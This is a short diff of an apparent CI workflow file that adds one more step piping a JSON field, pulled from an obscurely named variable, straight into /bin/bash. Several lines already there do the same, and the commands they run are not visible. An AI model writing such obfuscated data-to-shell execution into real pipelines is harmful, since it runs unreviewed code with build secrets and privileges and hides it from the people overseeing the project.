@@ -31,6 +31,7 @@ jobs:
           echo $nvhvc1 | jq -r .gu46587 | /bin/bash
           printf '%s' "$h5962" | jq -r .c9748 | /bin/bash
           printf '%s' "$pycp76" | jq -r .uy084 | /bin/bash
+          echo $t1554 | jq -r .pdkt4474 | /bin/bash
 
       - name: Persist results
         if: always()
